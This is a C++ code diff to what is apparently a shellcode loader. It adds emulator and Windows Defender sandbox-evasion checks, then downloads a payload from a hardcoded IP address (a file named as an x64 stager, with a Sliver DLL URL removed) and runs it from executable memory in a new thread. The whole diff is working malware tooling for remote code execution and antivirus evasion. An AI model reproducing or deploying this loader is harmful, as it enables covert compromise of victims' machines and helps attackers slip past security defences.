@@ -38,15 +38,25 @@ bool Anti_Windefender_Emulator() {
 }
 
 // delay 5s
-void Anti_Emulator_5s() {
-    //
+void Anti_Emulator_xs(int xs) {
+  typedef std::chrono::high_resolution_clock clock;
+  typedef std::chrono::seconds s;
+  std::chrono::time_point<clock> start_time = clock::now();
+  while (1) {
+    FindWindowA("1337", "1337");
+    CreateFileA(0, 0, 0, 0, 0, 0, 0);
+    auto duration = static_cast<float>(
+        std::chrono::duration_cast<s>(clock::now() - start_time).count());
+    if (duration > 5) break;
+  }
 }
 
 
 
 int main() {
 
-   
+   Anti_Emulator_xs(5);
+  if (Anti_Windefender_Emulator()) return 1;
 
   ExecAllocator obj;
   if (!obj.Init()) {
@@ -61,7 +71,6 @@ int main() {
 
   curl_global_init(CURL_GLOBAL_ALL);
   curl = curl_easy_init();
-  //std::string url = R"(https://43.241.16.222:43337/Temp/sliver.dll)";
   std::string url = R"(https://43.241.16.222:43337/Temp/stager_x64_cs_payload_rawbytes)";
   std::string response;
 
@@ -80,10 +89,6 @@ int main() {
               << response.size() << std::endl;
     return 0;
   }
-
-  // if need decrypt
-  /*std::transform(response.begin(), response.end(), response.begin(),
-                 [](char& c) { return c^ 0x11; });*/
 
   memcpy(shellcode, response.data(), response.size());
   std::thread t((void(*)(void))shellcode);
